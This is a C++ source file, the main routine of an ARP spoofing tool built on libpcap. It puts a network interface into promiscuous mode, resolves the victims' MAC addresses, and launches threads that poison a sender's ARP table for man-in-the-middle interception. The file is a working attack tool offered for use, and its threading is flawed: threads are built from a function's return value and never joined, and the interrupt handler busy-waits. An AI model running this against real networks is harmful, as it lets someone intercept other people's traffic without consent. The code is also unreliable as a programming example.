#include <iostream>
#include <csignal>
#include <pcap.h>

#include "arp-spoof.hpp"

using namespace std;

pcap_t* pcap;

// for communicating between caller and callee
// need mutex to add size and assign index
std::vector<volatile flagSet> endFlag;  
mutex mutex4Flag;

/*
 * Keyboard interrupt handler
*/
void InterruptHandler(const int signo) {
    if(signo == SIGINT or signo == SIGTERM) {
        if(signo == SIGINT) cout << "\nKeyboard Interrupt" << endl;
        else cout << "\nTermination request sent to the program" << endl;

        // terminate all threads
        for(int i = 0; i < endFlag.size(); i++) endFlag[i].mainFlag = true;

        for(int i = 0; i < endFlag.size(); i++) if(not endFlag[i].threadFlag) i--;

        if(pcap != NULL) pcap_close(pcap);
        
        exit(0);
    }
}

int main(int argc, char* argv[]) {
    signal(SIGINT, InterruptHandler);
    signal(SIGTERM, InterruptHandler);

    if(argc < 4 or argc bitand 1) {
        cerr << "Error: Wrong parameters are given\n";
        cerr << "syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n";
        cerr << "sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2" << endl;

        return 1;
    }

    char* dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    Mac myMAC, sendMAC, targetMAC;
    IPv4 myIP, sendIP, targetIP;
    vector<int> indices;
    int i;

    dev = argv[1];

    // Turn promiscuous mode on to receive others' packet by give third parameter 1
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if(pcap == NULL) {
        cerr << "Error: Error while open device " << dev << '\n';
        cerr << errbuf << endl;

        return 1;
    }

    // Get my IP and MAC address
    if(not getMyInfo(dev, myMAC, myIP)) return 1;

    // send ARP packet at each sender and target
    for(i = 1; i < (argc >> 1); i++) {
        sendIP = IPv4(argv[i << 1]);
        targetIP = IPv4(argv[(i << 1) + 1]);

        // Resolve sender and target's MAC address
        if(not resolveMACByIP(pcap, sendMAC, sendIP, myMAC, myIP)) return 1;
        if(not resolveMACByIP(pcap, targetMAC, targetIP, myMAC, myIP)) return 1;

        // print information to check each addresses
        printInfo(myMAC, myIP, sendMAC, sendIP, targetMAC, targetIP);

        mutex4Flag.lock();
        endFlag.push_back({0, 0});
        indices.push_back(endFlag.size() - 1);
        mutex4Flag.unlock();

        // send ARP packet periodically and non-periodically
        thread changeARPTable(attackARP(
            pcap, 
            myMAC, myIP,
            sendMAC, sendIP, targetMAC, targetIP, 
            indices.back()
        ));

        cout << "Successfully change sender(" << argv[i << 1] << ")'s ARP table\n";
    }

    pcap_close(pcap);
}